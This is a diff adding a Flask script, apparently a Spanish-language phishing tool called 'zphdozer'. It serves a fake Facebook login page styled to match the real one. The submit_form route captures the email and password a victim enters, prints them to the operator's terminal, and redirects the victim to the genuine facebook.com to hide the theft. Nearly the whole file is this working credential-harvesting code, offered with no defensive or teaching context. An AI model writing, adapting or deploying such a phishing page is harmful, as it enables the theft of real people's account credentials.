@@ -1,0 +1,169 @@
+import os
+from flask import Flask, request, redirect
+import threading
+
+# Configuración de Flask
+app = Flask(__name__)
+
+# Ruta para la página principal
+@app.route('/')
+def index():
+    return '''
+    <h1>Bienvenido a zphdozer</h1>
+    <p>Marca 1 para elegir la primera opción</p>
+    <p><a href="/facebook_login">1: Facebook login</a></p>
+    '''
+
+# Ruta para el formulario de inicio de sesión
+@app.route('/facebook_login')
+def facebook_login():
+    return '''
+    <!DOCTYPE html>
+    <html lang="es">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook - Iniciar sesión</title>
+        <link rel="stylesheet" href="/static/styles.css">
+    </head>
+    <body>
+        <div class="login-container">
+            <div class="login-header">
+                <h1>Facebook</h1>
+            </div>
+            <div class="login-form">
+                <form action="/submit_form" method="POST">
+                    <div class="input-group">
+                        <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" name="password" placeholder="Contraseña" required>
+                    </div>
+                    <div class="input-group">
+                        <button type="submit">Iniciar sesión</button>
+                    </div>
+                </form>
+                <div class="links">
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                    <br>
+                    <a href="#">Crear cuenta nueva</a>
+                </div>
+            </div>
+        </div>
+    </body>
+    </html>
+    '''
+
+# Ruta para manejar el envío del formulario
+@app.route('/submit_form', methods=['POST'])
+def submit_form():
+    email = request.form['email']
+    password = request.form['password']
+
+    # Imprimir los datos en la terminal
+    print(f"Correo electrónico o teléfono: {email}")
+    print(f"Contraseña: {password}")
+
+    # Redirigir al usuario a Facebook
+    return redirect('https://www.facebook.com')
+
+# Configuración para servir archivos estáticos (CSS)
+@app.route('/static/<path:filename>')
+def static_files(filename):
+    return app.send_static_file(filename)
+
+def create_css():
+    css_content = '''
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f2f5;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+
+    .login-container {
+        background-color: #ffffff;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        width: 360px;
+        text-align: center;
+    }
+
+    .login-header h1 {
+        color: #1877f2;
+        font-size: 24px;
+        margin-bottom: 20px;
+    }
+
+    .login-form .input-group {
+        margin-bottom: 15px;
+    }
+
+    .login-form input[type="text"],
+    .login-form input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        border: 1px solid #dddfe2;
+        border-radius: 5px;
+        font-size: 14px;
+        box-sizing: border-box;
+    }
+
+    .login-form button {
+        width: 100%;
+        padding: 10px;
+        background-color: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+
+    .login-form button:hover {
+        background-color: #165ec8;
+    }
+
+    .links {
+        margin-top: 20px;
+    }
+
+    .links a {
+        color: #1877f2;
+        text-decoration: none;
+    }
+
+    .links a:hover {
+        text-decoration: underline;
+    }
+    '''
+    os.makedirs('static', exist_ok=True)
+    with open('static/styles.css', 'w') as css_file:
+        css_file.write(css_content)
+
+def run_server():
+    app.run(host='0.0.0.0', port=5000)
+
+def main():
+    # Aquí puedes agregar cualquier texto de bienvenida que desees mostrar antes de iniciar el servidor
+    print("")
+    print("Marca 1 para elegir la primera opción")
+    print("1: Facebook login")
+    
+    choice = input("Selecciona una opción: ")
+    
+    if choice == '1':
+        print("Iniciando el servidor...")
+        create_css()
+        # El servidor se ejecuta en un hilo separado para que el script principal continúe
+        server_thread = threading.Thread(target=run_server)
+        server_thread.start()
+        # Proporcionar la URL de acceso
+        print("El formulario de inicio de sesión está disponible en: http://localhost:5000/facebook_login")
+
+if __name__ == '__main__':
+    main()
